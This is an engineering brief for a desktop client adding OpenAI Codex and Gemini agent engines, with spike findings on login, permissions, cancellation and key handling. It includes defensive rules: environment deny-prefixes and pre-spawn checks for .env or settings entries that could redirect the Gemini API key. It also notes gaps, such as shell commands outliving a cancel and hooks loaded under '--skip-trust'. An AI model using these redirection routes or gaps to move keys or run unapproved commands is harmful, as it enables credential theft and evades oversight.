# Guild 3.1 - more engines: OpenAI Codex first, Gemini next

Date: 2026-10-13. Owner decisions recorded as D-066 (sections 1 to 6) and D-067 (sections 7 to 11) in
`docs/04-DECISION-LOG.md`. This document is the implementation brief for Guild 3.1 part 1 (the generic multi-engine
foundation and the Codex engine, sections 1 to 6) and part 2 (the Gemini engine and the new app icon with the Dock
choice, sections 7 to 11).
Facts marked **[spike]** were measured on this machine on 2026-10-13 with `@agentclientprotocol/codex-acp`
2.2.2 (bundled `@openai/codex` 0.160.1, native `codex-cli 0.160.1`), node 26.8.1, an existing ChatGPT
subscription login made by the owner with `codex login`, and the owner's real `~/.codex` configuration. The
spike scripts live outside the repository. Guild 3.0 stays as `docs/20-GUILD3-DUAL-ENGINE.md`; nothing there
changes for the Grok and Claude engines.

## 1. Goal

A task can run on a third engine, **OpenAI Codex** with the owner's ChatGPT subscription, next to Grok and Claude
Code, in the same window and with the same model picker, permission cards, browser pane and per-turn model line.
The work is split so a fourth engine (Gemini) is a small addition: the engine list, the picker groups, the per-engine
defaults, the settings section, the sidebar marker and the wording are driven by one engine registry instead of
`grok | claude` conditionals. Grok and Claude behave exactly as in 3.0.5.

## 2. Spike findings [spike]

The question was whether the Codex ACP adapter can use the ChatGPT subscription login that `codex login` already
made, headlessly, without Guild touching credentials. It can.

| Item | Fact |
|---|---|
| Package | `@agentclientprotocol/codex-acp` 2.2.2, `bin: codex-acp -> dist/index.js`. `files` is `dist/index.js` (one 1.7 MB bundle, its JavaScript dependencies inlined), `README.md`, `LICENSE`, `package.json`. Apache-2.0. |
| Codex core | The adapter does not talk to OpenAI itself. It starts `codex app-server` (JSON-RPC over stdio) and translates. It depends on `@openai/codex ^0.160.1`; npm installs the native Mach-O (`@openai/codex-darwin-arm64/vendor/aarch64-apple-darwin/bin/codex`, 241 MB, plus `codex-code-mode-host`, 65 MB) into the adapter's own `node_modules` (346 MB in all). Without `CODEX_PATH` the adapter runs `process.execPath <resolved>/@openai/codex/bin/codex.js app-server`, a wrapper that only adds `CODEX_MANAGED_*` variables and spawns the native binary. With `CODEX_PATH=<native binary>` it spawns that binary directly. Both were run; both work. |
| Which codex | The owner's global `codex` (`~/.npm-global/bin/codex`, 0.160.0) is not used by the adapter. The login is shared because both read `~/.codex` (`auth.json`; Guild never opens it). |
| initialize | 0.1 s to 4 s. `agentCapabilities`: `loadSession`, `sessionCapabilities.{resume,list,close,delete,fork,additionalDirectories,subagents}`, `mcpCapabilities.{http:true,sse:false,acp:false}`, `promptCapabilities.{image,embeddedContext}`, `auth.logout`, `providers`, `_meta.authStatus`. `_meta.steering.supported: true`. |
| Auth methods | `authMethods` is `[api-key, chat-gpt]` even when logged in (the adapter does not shrink the list). **No `authenticate` call was needed**: a clean `env -i` process with only `HOME USER LOGNAME PATH` and the proxy variables created a session and ran turns on the subscription. Guild never calls `authenticate` for Codex. |
| Account | Out-of-session notification `_auth/status_update {authStatus:{kind:"account", label:"ChatGPT Plus", account:{email, plan:"plus"}}}` (same wire as the Claude adapter). Other kinds the adapter source defines: `api_key` ("OpenAI API key"), `gateway`, `external` ("AWS Bedrock"), `none` ("Not logged in"). The e-mail is never read by Guild. |
| Not logged in | With an empty `CODEX_HOME`, `initialize` still succeeds and `session/new` fails with JSON-RPC `-32000` "Authentication required" (ACP `authRequired`), no `_auth/status_update`. |
| session/new | Result keys `sessionId, models, modes, configOptions`; 1 s to 3.3 s. Config options (select unless noted): `mode` (category `mode`: `read-only` "Read-only", `workspace-write` "Workspace access", `agent` "Auto review", `agent-full-access` "Full access"; initial `agent`), `collaboration_mode` (category `collaboration_mode`: `default`, `plan`), `model` (category `model`: seven ids on this account, such as `gpt-6.1-sol`, `gpt-6-luna`, `gpt-5.6-luna`; current = the owner's `config.toml` default), `reasoning_effort` (category `thought_level`: `low medium high xhigh max ultra`, the list is rebuilt for the selected model: the Luna models end at `max`), `fast-mode` (category `model_config`, `off`/`on`). |
| Model ids | Bare ids in `configOptions` (`gpt-6.1-sol`). The legacy `models.availableModels` list repeats every model once per effort as `gpt-6.1-sol[low]`; it is the only place that tells a model's efforts before that model is selected. |
| Cheapest model | `gpt-5.6-luna` ("Older fast and efficient model") with effort `low`; used for every spike turn. |
| Resume | Killing the adapter and calling `session/resume` (or `session/load`, which replays the history as `user_message_chunk` / `agent_message_chunk` / `tool_call` before its result) with the same `sessionId` continues the conversation (the model recalled the file it created). **The resumed session does not restore the model, the effort or the mode**: it came back on `gpt-6.1-sol`, effort `high`, mode `agent`. Guild applies the stored selection and permission mode after every start, before the first prompt. |
| Missing session | `session/resume` of an unknown id answers `-32603` "Internal error" with `data.details` "no rollout found for thread id ..."; a malformed id answers `-32603` "invalid session id". Not `-32002`. The Codex dialect classifies the first as "session not found". |
| Permissions | `session/request_permission` toolCall `{kind:"execute"\|"edit"\|..., title:"Run command"\|"Edit files", rawInput, locations?}`. Option kinds seen: command `allow_once` "Yes, proceed", `allow_always` "Yes, and don't ask again for commands that start with `...`" (id `accept_execpolicy_amendment`, **writes a persistent rule into the user's Codex rules**), `reject_once` "No, and tell Codex what to do differently" (id `cancel`); file edit `allow_once`, `allow_always` ("don't ask again for these files", id `allow_for_session`), `reject_once`; MCP tool `allow_once` "Allow", `allow_always` "Allow for this session" (id `allow_session`), `allow_always` "Always allow" (id `allow_always`), `reject_once` "Cancel". |
| When it asks | Observed: `read-only` asked for a file edit and for commands; `workspace-write` asked for an MCP tool call (it did not ask for a command that wrote inside the workspace in the two runs made); `agent` (Auto review) sent no request for an MCP call but a "Guardian Review" tool call (`kind: think`, text "Status: Approved ... Rationale: ...") showing an automated reviewer's decision; `agent-full-access` ran a shell loop with no request. |
| Reject / cancel | `reject_once` on a command or edit ended the turn with `stopReason: "cancelled"`; on an MCP call the tool failed ("user cancelled MCP tool call") and the turn went on (`end_turn`). A permission answered with the ACP `cancelled` outcome ended the turn `cancelled`. |
| Tool calls | `tool_call` / `tool_call_update` with `kind: execute` (content `{type:"terminal", terminalId}` and `_meta.terminal_info`, `_meta.terminal_exit`), `edit` (content `{type:"diff", path, oldText, newText}`), `think` (guardian review), MCP calls (`title: "mcp.<server>.<tool>"`, `rawInput {server, tool, arguments}`, `_meta.is_mcp_tool_call`). Without the client `terminal` capability the adapter still sends `terminal` content. |
| Turn frames | `session_info_update` with `_meta.codex.threadStatus {type:"active"\|"idle", activeFlags:["waitingOnApproval"]}` and, once, the title; `agent_thought_chunk`, `agent_message_chunk`, `usage_update {used, size}` (context tokens used and window, 258400 here), `available_commands_update` (57 commands at start, 220 after the first turn: built-in `plan mcp skills status review review-branch review-commit compact goal rename logout` plus every skill as `$name` or `$plugin:name`). |
| Prompt result | `{stopReason, usage:{totalTokens, inputTokens, cachedReadTokens, cachedWriteTokens, outputTokens, thoughtTokens}, _meta:{quota:{token_count, model_usage:[{model, token_count}]}}}`. `model_usage[0].model` names the model that answered. |
| Late frames | After the prompt result: `available_commands_update` every time; after a cancel also the `tool_call_update` frames of the still running command. They must be applied as session metadata or dropped, never open an agent-initiated Run (same rule as Claude, `late_update_dropped`). |
| Cancel | `session/cancel` (a notification) answers the pending prompt within 25 ms with `stopReason: "cancelled"`, and the session accepts the next prompt at once. **A foreground shell command Codex started is not stopped by it**: `for i in $(seq 1 120); do date +%s >> beat.txt; sleep 1; done` kept appending after the cancelled result, until the adapter process group was killed (Guild's process host does that on close and quit; the command died with it). Codex has a targeted stop (`_session/async_task/stop`) only for clients that negotiate the AIR `asyncTasks` capability. Guild does not in 3.1; the reduced state is documented (section 4.8). |
| Steering | `_session/steering {sessionId, prompt, _meta:{steering:{idleBehavior:"promptRequired"}}}` -> `{outcome:"injected"}` during a turn (the final reply obeyed the injected instruction). **Codex ignores `idleBehavior`**: with no turn running it answers `{outcome:"startedNewTurn"}` and runs the text as a new turn. Guild therefore never asks while its own prompt is not in flight, and cancels a turn it did not start. |
| Fork | `session/fork {sessionId, cwd, mcpServers}` -> `{sessionId, modes, configOptions}`; the fork knew the earlier conversation. |
| HTTP MCP | `mcpServers: [{type:"http", name, url, headers:[]}]` in `session/new` works; the Codex app-server (not the adapter) connects (`initialize`, `notifications/initialized`, `tools/list`, `tools/call` over POST with `Accept: text/event-stream, application/json`; the JSON response form is accepted). The loopback URL needs `NO_PROXY=127.0.0.1,localhost` in the adapter's environment. |
| Unknown methods | `_guild/ping` answers `-32601`; the liveness probe treats it as alive. `session/list` lists the owner's own Codex sessions: Guild never calls it. |
| Process tree | `node adapter -> [node codex.js] -> codex native (same process group)`, then, each in its own process group, every MCP server and plugin helper of the owner's `~/.codex/config.toml` (computer-use, node_repl, a Schwab connector, the OpenViking proxy ...) and every shell command. The helper sweep of `docs/20` 3.2 (descendants outside the group, identity-checked) is the mechanism that covers them. After the spike clients signalled the process group, none of the helper processes looked for (the MCP servers, `sleep`) was left running. |
| OpenViking | The owner's Codex has the OpenViking memory plugin; its hooks (`SessionStart`, `UserPromptSubmit`, `Stop` ...) are loaded by adapter sessions (the app-server log lists them), so spike turns may have been captured into the memory store. For the Codex plugin `OPENVIKING_MEMORY_ENABLED` **has no effect** (its own doctor says so); the switches are `OPENVIKING_AUTO_RECALL=false` and `OPENVIKING_AUTO_CAPTURE=false`. Guild sets both and the Grok block (config files to `/dev/null`, URLs to a closed loopback port). |
| Persona and config | Codex loads the owner's `~/.codex/AGENTS.md`, `config.toml` (plugins, MCP servers, hooks) and skills exactly as the owner's own `codex` does; Guild does not isolate them. |
| Latency | A model turn of one word took 6 s to 58 s through the owner's proxy; the adapter itself is quick (initialize and session start under 5 s). The start windows of the Claude adapter (`docs/20` 3.2) are reused with a smaller bound (180 s). |

Not tested, so not claimed: image prompts, `plan` collaboration mode, `fast-mode`, subagent sessions, `/goal`.

## 3. Foundation: N engines

### 3.1 Engine registry (contracts)
`GUILD_ENGINES = ["grok", "claude", "codex"]`. The model groups become `grok | claude | codex | online | local`
(`codex` is the group of the Codex engine, named "ChatGPT" in the picker). One descriptor per engine holds what the rest
of the code used to infer from the engine's name: its picker groups, its marker letter for the sidebar (`G`, `C`, `X`),
whether it is an *add-on engine* and, for those, the permission modes it offers. **Add-on engines** are the engines that
are neither Grok nor Claude: a user-installed ACP adapter with the user's own login, no model router, no Online or Local
models, Guild-level defaults stored per engine. `codex` is the first; Gemini is the second.

### 3.2 Schema 21 (forward-only)
Guild 3.0.x databases (schema 19 and 20) migrate on open.
1. `task_metadata.engine` and `runtime_model_catalog.engine` stop listing engine names in a CHECK: they accept a
   lowercase identifier (`^[a-z][a-z0-9]{1,15}$`), and the application's engine registry is the allowlist. Adding an
   engine is then not a schema change. SQLite cannot alter a CHECK, so both tables are rebuilt (the standard twelve step
   procedure with `foreign_keys` off during the rebuild and `foreign_key_check` before commit); the indexes and the
   triggers of `task_metadata` are recreated byte for byte, `routed_at_ms` stays legal only on a Claude task.
2. The two triggers that keep a task's runtime model in its engine's grammar treat every engine but Grok as the wider
   grammar (`COALESCE(engine, 'grok') = 'grok'` is the strict case).
3. `engine_defaults(engine PRIMARY KEY, model, effort, permission_mode)` holds the Guild-level defaults of the add-on
   engines. A missing row means "follow the engine's own default, permission mode `workspace-write`" (the first add-on
   engine's value; each engine states its own).
4. A task bound to an engine the build does not know (a database written by a later Guild) cannot be created; reading
   one fails closed with the existing integrity error.

### 3.3 Everything else keyed by engine
Catalog cache rows, model-picker catalogs (`modelCatalogs`), the Engines settings section, the sidebar marker, the
locale wording of a task's conversation, the process profile and the runtime factory are all looked up by engine. The
Claude-only machinery (router, native and routed processes, `modelPicker`, OpenViking capture policy) stays Claude's.

## 4. The Codex engine

### 4.1 Process
- Executable: the user's `node` (>= 22, pinned per launch exactly like the Claude engine: first supported node of the
  launch, SHA-256 compared before every run) running the adapter's `dist/index.js`.
- Locator: `codex-acp` from `~/.npm-global/bin`, `~/.local/bin`, the Homebrew paths and the version managers, never the
  `PATH` of a packaged app (section 12.3); supported adapter versions
  `>=2.0.0 <3.0.0`; the pin is the package version plus a SHA-256 over `package.json` and every file under `dist/`, as for
  Claude; a mismatch refuses to start (`adapter_changed`) and a later locate accepts only an update.
- Bundled core: found from the adapter's package root the way Node resolves it (its own `node_modules`, then the
  ancestors'), `@openai/codex-<platform>-<arch>/vendor/<triple>/bin/codex`, a real Mach-O whose version is read from the
  neighbouring `codex-package.json` (never by running it). It is pinned by real path, version and size (241 MB is not
  hashed at every spawn, like the 200 MB `claude`), handed to the adapter as `CODEX_PATH`, so the binary Guild checked is
  the binary that runs. A locate after a failed check accepts a core only when the adapter's version changed.
- Environment: the Claude allowlist (PATH, LANG, LC_*, TMPDIR, proxy and SSL variables, `USER`, `LOGNAME`;
  `NO_PROXY=127.0.0.1,localhost` always), no inherited `CODEX_*` or `OPENAI_*` variable, so `CODEX_HOME` is never
  redirected and no API key can reach the adapter. Guild-owned values: `CODEX_PATH`, `OPENVIKING_AUTO_RECALL=false`,
  `OPENVIKING_AUTO_CAPTURE=false` and the Grok OpenViking block (docs/20 3.6 for the policy: Claude Code and Codex are
  the engines OpenViking is meant for, but a Guild Codex session neither reads nor writes the store).
- Start windows: `initialize` and `session/new|resume|load` wait up to 180 s; a request without an answer is
  `request_timeout` (the session is kept, the send says Codex is still starting), a process that dies before answering a
  resume does not lose the session. Only the missing-session answer of section 2 ends in `restore_failed`.
- No model router. Codex talks to OpenAI itself; the Online reminder and the router never apply to a Codex task.

### 4.2 Login
Guild never reads `~/.codex` and never calls `authenticate`. A Codex that is not logged in fails `session/new` with
`-32000`; Settings > Engines then says "Not logged in. Run `codex login` in Terminal." The account line shows the
adapter's ChatGPT plan label (for example "ChatGPT Plus") when the adapter reports a ChatGPT account, and "Managed by
Codex" for any other kind. There is no API key field.

### 4.3 Models and effort
The picker group "ChatGPT (subscription)" lists the models of the `model` config option. The efforts of every model come
from `models.availableModels` (`id[effort]`), the effort of the selected model from the `reasoning_effort` option; both
are applied with `session/set_config_option`, model first. The strongest-first order of the efforts knows `ultra`.
Before any Codex session exists the group offers one row, "Codex (default model)", which binds a new task to Codex and
follows Codex's own default (same rule as Claude Code's first run). `fast-mode` and `collaboration_mode` are not shown.
After every start (new, resume, load) the stored selection is applied before the first prompt, because a resumed
session forgets it (section 2); a model the session does not offer refuses the prompt (`model_selection_failed`).
Clearing a task's own model pins nothing: the live session keeps the model it runs (the projection says so, as for Grok) and
a session that starts afterwards runs on Codex's own pick or the Settings default.

### 4.4 Permission mode
Guild's selector shows the four adapter modes with its own Chinese and English wording: Read-only, Workspace access
(default), Auto review, Full access. The mode is a config option, applied after every session start and before every
turn, and a failed change refuses the turn: a resumed session comes back in `agent` (Auto review) and must never run
looser than the setting. Permission cards use the 3.0.2 labels by ACP kind; an "always" option keeps the agent's own
words unless they say "session", so the persistent-rule option of a command reads as the agent wrote it.

### 4.5 Browser pane
The browser MCP server is handed to `session/new|resume|load` when `initialize` advertised `mcpCapabilities.http`.

### 4.6 Steer, queue, fork, rewind
Steer maps to `_session/steering` and is attempted only while Guild's own prompt is in flight; `injected` is success,
`promptRequired` (Guild-side, no wire call) and `failed` fall back to an ordinary message, and `startedNewTurn` (a race:
the turn ended while the request was in flight) cancels the turn Codex started and falls back as well. Queued messages
are Guild's own queue. Branch copies Guild's local transcript and starts a new Codex session (as for Claude).
Conversation rewind is files only (Codex has no conversation rewind through ACP).

### 4.7 Usage and account
The usage panel shows the context ring from `usage_update` and "Quota: managed by Codex". The per-turn model line
(3.0.2) shows the display name of the model the Run started on.

### 4.8 Reduced states (PC-FALLBACK-001)
Not installed (adapter or its bundled core missing, unsupported adapter major): the command `npm install -g
@agentclientprotocol/codex-acp`. Not logged in: `codex login`. Changed files: the existing integrity text, naming
`codex-acp`. **Stop** ends the turn but a foreground shell command Codex already started may keep running until the
task's process closes; the Stop help text for a Codex task says so. A turn Codex runs on its own after a cancel is
cancelled, never shown.

## 5. Acceptance (installed app)
1. A fresh Codex task: the picker's "ChatGPT" group lists the account's models, the cheapest is chosen, one turn runs a
   tool behind a permission card, the footer names the model.
2. Quit and reopen Guild; the task resumes (the stored model and permission mode are applied before the next turn).
3. The sidebar shows the task with the Codex marker; Settings > Engines shows the Codex section and its status.
4. Grok and Claude tasks behave as in 3.0.5.

Automated as check I of `scripts/run-guild3-qa.mjs` (run with `GUILD_QA_CODEX_ACP=<codex-acp package directory>`, which the script
hands to the unpackaged app as the dev-only `GUILD_DEV_CODEX_ACP`; a packaged app ignores it, and the locator pins whatever it
finds there like any other install). It uses a fresh isolated data directory, the cheapest model of the account (the first
`Luna` entry of the list, effort low), the `read-only` mode so that a shell write needs approval, decides the card through the
UI, then quits and relaunches Guild and sends a second turn. It asserts: the ChatGPT group lists every model the account
reports, the card appears and clears, the file is written, the footer and the stored label name the model, the adapter process
has `CODEX_PATH` set, the OpenViking switches off and no Anthropic or OpenAI variable, the sidebar shows the `X` marker next
to the Grok and Claude markers, the account card is Codex's (plan label only when reported), Settings > Engines shows the Codex
section, the same Codex rollout holds both turns after the restart, and the mode and model are applied again before the
second turn. The rollouts the run created (those naming its workspace) are removed at the end; Codex's own index and database
rows for them are left alone.

## 6. What the owner installs
`npm install -g @agentclientprotocol/codex-acp` (Node >= 22 already on PATH; the package brings its own Codex core), and
`codex login` once if `codex` is not logged in (it is, on this machine).

## 7. Gemini spike findings [spike]

Measured on 2026-10-13 with `@google/gemini-cli` 0.63.0 (installed into a scratch folder with `npm install`, nothing
global), node 26.8.1, a Gemini API key (`GEMINI_API_KEY`) read from the owner's key file, an isolated `HOME` and
`GEMINI_CLI_HOME`, and a stand-alone ACP client. The owner's `~/.gemini` was never read, listed or written. The CLI runs
as an ACP v1 agent over stdio with only the key; no browser or OAuth step happens. Verified: `initialize`,
`session/new`, a prompt with a tool behind a permission request, cancel, `session/load` after a restart, an HTTP MCP
server.

| Item | Fact |
|---|---|
| Launch | `gemini --acp` (`--experimental-acp` is deprecated); child argv `node .../bundle/gemini.js --acp [--skip-trust]`. The package is `bin: gemini -> bundle/gemini.js`, `files: bundle/` (446 files, 95 MB), Apache-2.0. Native optional dependencies (`@github/keytar`, `node-pty`) are not needed; npm skipped their install scripts and nothing broke. |
| Environment | `HOME` and `GEMINI_CLI_HOME` = a Guild-owned directory, `PATH`, `USER`, `LOGNAME`, proxy variables, `NO_PROXY=127.0.0.1,localhost`, `GEMINI_API_KEY`, `GEMINI_CLI_NO_RELAUNCH=1` (without it the CLI relaunches a child process, and a SIGKILL of the parent orphans it), `NODE_USE_ENV_PROXY=1` (node 26 ignores `HTTPS_PROXY` otherwise and every request times out). `GOOGLE_GEMINI_BASE_URL` flips the auth type to `gateway`; `GOOGLE_GENAI_USE_GCA` selects OAuth. Neither may be set. |
| settings.json | `<home>/.gemini/settings.json`: `{"security":{"auth":{"selectedType":"gemini-api-key"}},"privacy":{"usageStatisticsEnabled":false},"general":{"enableAutoUpdate":false,"enableAutoUpdateNotification":false},"model":{"name":"<model>"}}`. Without `selectedType`, `session/load` after a restart fails with `-32000` "Authentication required". The alternative, `authenticate {"methodId":"gemini-api-key","_meta":{"api-key":"<key>"}}`, keeps the key in memory only but must be re-sent per process; Guild does not use it. |
| Real-home hazard | Never point the CLI at the owner's `~/.gemini`: `authenticate` with another stored `selectedType` calls `clearCachedCredentialFile()` (deletes cached OAuth credentials), and a real `settings.json` with `oauth-personal` starts a browser flow. |
| No / bad key | Missing key: `initialize` succeeds, `session/new` fails `-32000` "Gemini API key is missing or not configured." Invalid key: the prompt fails with a 400 containing `API_KEY_INVALID`. |
| initialize | `protocolVersion` 1; `authMethods`: `oauth-personal`, `gemini-api-key` (`_meta.api-key.provider google`), `vertex-ai`, `gateway`; `agentInfo` gemini-cli 0.63.0; `agentCapabilities`: `loadSession` true, `promptCapabilities` image/audio/embeddedContext true, `mcpCapabilities` http and sse true. No `sessionCapabilities.resume`. `authenticate` is not required for the API-key flow. |
| session/new | `modes`: `default`, `autoEdit`, `yolo`, `plan` (current `default`). `models.availableModels`: `auto`, `gemini-3.1-pro-preview`, `gemini-3-flash-preview`, `gemini-2.5-pro`, `gemini-3.8-flash`, `gemini-3.5-flash-lite` (current `auto`). There are no `configOptions`; `session/set_config_option` answers `-32601`. |
| Model selection | `session/set_model {sessionId, modelId}` -> `{}` between prompts. It accepts ids the list does not contain (a bad id fails only at the prompt). `settings.json` `model.name` sets `currentModelId` at `session/new`. The default `auto` can route to Pro, and it comes back after `session/load` unless `model.name` is set, so the model is always set explicitly. |
| Thinking | No thinking level over ACP. Per model in `settings.json` `modelConfigs.overrides` (restart needed), for example `{"match":{"model":"gemini-2.5-flash-lite"},"modelConfig":{"generateContentConfig":{"thinkingConfig":{"thinkingBudget":0,"includeThoughts":false}}}}`. |
| Modes | `session/set_mode {sessionId, modeId}`; an unknown id answers `-32603`. A change emits an `agent_message_chunk` whose text is `[MODE_UPDATE] yolo` instead of a `current_mode_update`. |
| Prompt with a tool | `agent_thought_chunk` x2, `tool_call` (pending, kind `edit`, a `diff` content block with `_meta.kind`), `session/request_permission` with options `proceed_always` "Allow for this session" (`allow_always`), `proceed_once` "Allow" (`allow_once`), `cancel` "Reject" (`reject_once`); then `tool_call_update` completed, `agent_message_chunk`, and the result `{"stopReason":"end_turn","_meta":{"quota":{"token_count":{"input_tokens":22065,"output_tokens":25},"model_usage":[...]}}}`. An MCP tool adds `proceed_always_server` and `proceed_always_tool`. No `rawInput`. Some shell commands run with no request at all. |
| Cancel | `session/cancel` mid-stream: the result `cancelled` arrives within milliseconds, without `_meta.quota`, and the session is reusable. **While a permission request is pending the prompt resolves only after the client answers that request with `{"outcome":{"outcome":"cancelled"}}`.** Nothing arrives after the result (3 s watched); `available_commands_update` arrives from a `setTimeout(0)` after `session/new`, possibly during the first prompt. |
| Resume / load | `session/resume` answers `-32601`. `session/load` (same cwd, `selectedType` set) answers `{modes, models}` and streams the history as `session/update` frames without waiting for it (the CLI calls `streamHistory` and returns its answer at once): the frames arrive before, around and after the answer, and nothing marks the end. They include a synthetic `user_message_chunk` starting `<session_context>` and `user_message_chunk` frames reading `[Function Response: write_file]`. The replay differs from the live frames: the tool title is the tool's name (`WriteFile`, live "Writing to hello.txt"), the diff path is relative, there is no `locations`, the tool call is already `completed`, and the final text lacks the live trailing newline. Sessions persist at `<home>/.gemini/tmp/<slug>/chats/session-<ts>-<id8>.jsonl` (prompts and tool output in full). |
| Usage | Only the prompt result `_meta.quota` (`input_tokens`, `output_tokens` per model); no `usage_update`, cost or cached tokens. `output_tokens` excludes thinking, and nothing is reported for a cancelled or failed turn. A trivial turn is about 10.9k input tokens, a tool turn about 22k (two requests). |
| HTTP MCP | `{"type":"http","name":"stub","url":"http://127.0.0.1:<port>/mcp","headers":[...]}` is accepted and its headers are sent on every request; tools appear behind permission requests. **Only in a trusted folder**: in an untrusted one the server is silently dropped. `--skip-trust` fixes that, and also allows `autoEdit` and `yolo`. |
| Client file system | Do not advertise it. If it is advertised, answering a read of a missing file with `-32002` breaks `write_file` for a new file. |
| Network | Only `generativelanguage.googleapis.com:443` (where the key goes) and, with usage statistics on, `play.googleapis.com`. Nothing else. |
| Telemetry | Usage statistics are on by default (`privacy.usageStatisticsEnabled: false` turns them off, verified). OpenTelemetry is off unless `GEMINI_TELEMETRY_ENABLED` is set. |
| Trust | `--skip-trust` also enables workspace `.gemini/settings.json`, hooks, skills and `GEMINI.md`, and the CLI loads `.env` files from the working directory upward and from `<home>/.gemini/.env`. The `.env` and settings behaviour was first left untested and later found to matter; it is measured in section 12. |

Eleven gotchas, highest impact first: (1) node 26 ignores the proxy variables, set `NODE_USE_ENV_PROXY=1`; (2) the default
model `auto` can route to Pro and returns after a load, set the model explicitly; (3) the real home is hazardous, use a
Guild-owned `GEMINI_CLI_HOME`; (4) an untrusted folder drops ACP MCP servers and refuses `autoEdit` and `yolo`, so
decide on `--skip-trust` deliberately; (5) two processes unless `GEMINI_CLI_NO_RELAUNCH=1`; (6) `[MODE_UPDATE]` is fake
chat text, filter it; (7) permission options by kind, and answer pending requests with `cancelled` after
`session/cancel`; (8) usage under-reports, the billing page is authoritative; (9) with no key `initialize` still
succeeds and the failure comes at `session/new`; (10) npm skipped the install scripts of the optional native
packages and the interactive shell tool of the CLI (`node-pty`) was not tested; (11) `session/load` does not wait for its
replay (see Resume / load): a client that closes the replay at the answer loses most of the history.

## 8. The Gemini engine

### 8.1 Process
- Executable: the user's `node`, pinned per launch exactly as for Claude and Codex, running the package's
  `bundle/gemini.js` in place with `--acp --skip-trust`. The package `@google/gemini-cli` is found from `~/.npm-global`,
  `~/.local/bin`, the Homebrew paths and the version managers as `gemini` (a command there must be the package's own
  `bundle/gemini.js`); a packaged app never searches its `PATH` (section 12.3). The dev-only `GUILD_DEV_GEMINI_CLI` root is
  honoured only by an unpackaged run.
- Supported versions `>=0.63.0 <0.70.0`. The pin is the package version plus a SHA-256 over `package.json` and every
  regular file under `bundle/` (about 95 MB, hashed at every spawn and by nothing else: the install probe of
  Settings only reads `package.json` and checks the entry exists). The optional native dependencies in the package's
  `node_modules` are not covered, and the CLI does not need them. A mismatch refuses to start (`adapter_changed`) and a
  later locate accepts only an update (a different version), never other bytes under the same version.
- Start windows: 180 s for `initialize` and `session/*`, like Codex; a timeout is "still starting", never a lost session.
- Environment: the Claude allowlist with `GEMINI_*` and `GOOGLE_*` denied by prefix. Guild-owned values:
  `HOME` and `GEMINI_CLI_HOME` (section 8.3), `GEMINI_CLI_NO_RELAUNCH=1`, `NODE_USE_ENV_PROXY=1`, `NO_PROXY` with
  the loopback hosts, the neutral values of section 12.1 and, per spawn only, `GEMINI_API_KEY`. After the environment is
  built it is checked: any `GEMINI_`/`GOOGLE_` variable beyond those, and a neutral variable with another value,
  refuses the start.
  OpenViking is not involved: the Gemini CLI has no OpenViking plugin; the Grok block (config files to `/dev/null`, URLs to a
  closed loopback port) is still applied as a guard.
- Before a spawn Guild reads what the CLI would load from the project folder and refuses to start, naming the file and
  the variable or setting but never a value, when it would move the key or change the sign-in method (section 12): the
  `.env` files, read with the CLI's own `dotenv` grammar (including `KEY: value`, `export`, quotes that span lines), and the
  folder's `.gemini/settings.json`. The child's environment also holds every such variable with a value Guild chose, so
  a file cannot supply them even if a check were missed.
- `--skip-trust` trade-off, accepted by the owner: the CLI then loads workspace `.gemini/settings.json`, hooks, skills,
  `GEMINI.md` and `.env` files in the user's own project folders. It is required for the browser MCP server (an untrusted
  folder drops it) and for the `autoEdit` and `yolo` modes. For a single-user local client that opens only the user's own
  folders this is acceptable; opening a folder from an untrusted source with Gemini is the user's risk. The checks above
  cover the files that could move the key or change the sign-in method; the settings that run code (`mcpServers`, `hooks`,
  `tools.discoveryCommand`) and `GEMINI.md` are the accepted risk and are not looked at.
- No model router, no `authenticate`, no client file-system capability.

### 8.2 The API key (pay-as-you-go, never a subscription)
- Settings > Engines > Gemini holds a key file (absolute path, or empty for `~/.config/guild/keys.env`) and a
  variable name (default `GEMINI_API_KEY`). The renderer sends only those two names; the database stores them
  (`engine_key_bindings`), never a value. The host is fixed by the engine: `generativelanguage.googleapis.com`.
- Binding: a change of file or variable clears the confirmation. **Confirm** opens the native main-process dialog, the same
  one a model source uses: "Allow Guild to send GEMINI_API_KEY from <file> to generativelanguage.googleapis.com?" The
  stored `confirmed_host` is written only by the main process after "Allow"; no request can set it.
- Use: at each launch the main process reads the variable from the file (`readKeyFromEnvFile`), requires a confirmed binding
  whose host is the Gemini host, and puts the value in the child's environment as `GEMINI_API_KEY`. It is redacted from every
  diagnostic (`redactValues`), never in argv, never in `settings.json`, never logged. An unconfirmed binding, a missing file or
  a missing variable ends the start with a named state ("Gemini needs an API key") and the Settings status says what is
  missing, without ever naming a value.
- `oauth-personal`, `vertex-ai` and `gateway` appear in the adapter's `authMethods`; Guild counts and ignores them and has no
  control to choose them.

### 8.3 Guild-owned home
`<userData>/engines/gemini-home` (mode 0700) is both `HOME` and `GEMINI_CLI_HOME` of every Gemini process, so the CLI's state,
its session files (`.gemini/tmp/<slug>/chats/*.jsonl`) and any cache live there, and the owner's `~/.gemini` is never opened.
Guild writes `<home>/.gemini/settings.json` (atomic replace, mode 0600) before each spawn: API-key auth, usage statistics off,
auto-update and its notice off, and `model.name` = the task's selected model when the list is known (never `auto`). Task
sessions are not deleted by Guild.

### 8.4 ACP dialect
The `gemini` dialect differs from plain ACP v1 and from the other two adapters in these ways.
- **Models and modes are session state, not config options.** The dialect presents `models` and `modes` of `session/new` and
  `session/load` as two select options so the rest of Guild is unchanged: `model` (category `model`; the `auto` entry is
  left out of the choices and a session that is on it reports an `unlisted` current value) and `mode` (category `mode`; ids
  `default`, `autoEdit`, `yolo`, `plan`). `setConfigOption("model", id)` is `session/set_model`, `setConfigOption("mode", id)`
  is `session/set_mode`; the adapter keeps the current values and returns the updated options.
- No effort option, so the effort row of the picker and of Settings is not shown for Gemini; a stored effort is ignored.
- Filtered frames: an `agent_message_chunk` whose text starts `[MODE_UPDATE]`, and (the replay of `session/load`) a
  `user_message_chunk` starting `<session_context>` and `user_message_chunk`s starting `[Function Response:`.
- Permission requests: options by kind (`allow_once`, `allow_always`, `reject_once`; the ids are the agent's own), so the
  3.0.2 labels apply. Cancelling a turn answers every permission request still pending with `{"outcome":{"outcome":"cancelled"}}`
  (the CLI does not resolve the prompt otherwise).
- Usage: the prompt result's `_meta.quota.token_count` (`input_tokens` + `output_tokens`) becomes the turn's token count for the
  context display, marked approximate; there is no window size, so no ring percentage. The usage popover says that billing is
  authoritative on Google AI Studio and shows no cost.
- Late frames are handled as for the other adapters (`available_commands_update` as metadata, content dropped).
- `session/resume` is not advertised, so a restart uses `session/load`. A load of a session the CLI does not have answers an
  error that the dialect classifies as "session not found" only when it names a missing session; any other failure keeps the
  session for the next try.

### 8.5 Models and modes
